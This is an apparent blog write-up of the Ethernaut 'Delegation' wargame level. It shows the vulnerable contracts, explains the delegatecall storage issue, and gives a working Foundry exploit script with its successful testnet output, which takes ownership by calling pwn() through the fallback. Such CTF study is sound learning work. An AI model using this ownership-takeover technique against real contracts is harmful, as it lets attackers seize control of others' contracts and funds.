---
layout: post
title: "[Ethernaut] 06.Delegation"
tags: blockchain ethernaut foundry delegatecall "storage collision"
---

# Analysis

---
The goal is

1. claim ownership

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

The `fallback()` function in the Delegation contract performs `delegatecall()` to the Delegate contract.

The Delegation contract's state can be changed by caliing the `pwn()` function in Delegate contract via `delegatecall()`.

`msg.sender` in the Delegate contract will be EOA because the call is made by using `delegatecall()`.

# Exploit

---

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DelegationSol is Script {
    Delegation public delegation_ = Delegation(0x604BD638031054664E87618f46871c5423E9cbFF);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address(delegation_).call(abi.encodeWithSignature("pwn()"));
        console.log("owner: ", delegation_.owner());

        vm.stopBroadcast();
    }
}
```

```bash
$ forge script script/DelegationSol.sol --broadcast
[⠊] Compiling...
[⠰] Compiling 1 files with Solc 0.8.29
[⠔] Solc 0.8.29 finished in 280.67ms
Compiler run successful with warnings:
Warning (9302): Return value of low-level calls not used.
  --> script/DelegationSol.sol:14:9:
   |
14 |         address(delegation_).call(abi.encodeWithSignature("pwn()"));
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Script ran successfully.

== Logs ==
  owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514

## Setting up 1 EVM.

==========================

Chain 17000

Estimated gas price: 0.001000019 gwei

Estimated total gas used for script: 43100

Estimated amount required: 0.0000000431008189 ETH

==========================

##### holesky
✅  [Success] Hash: 0xd749896a13ac87778efd535f37a37c59d6b88fedeb517b326aa83c0af160e8fd
Block: 3677303
Paid: 0.000000031204249632 ETH (31204 gas * 0.001000008 gwei)

✅ Sequence #1 on holesky | Total Paid: 0.000000031204249632 ETH (31204 gas * avg 0.001000008 gwei)

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.
```

![Image complete]({{site.url}}/images/2025-04-18-Delegation/complete.png)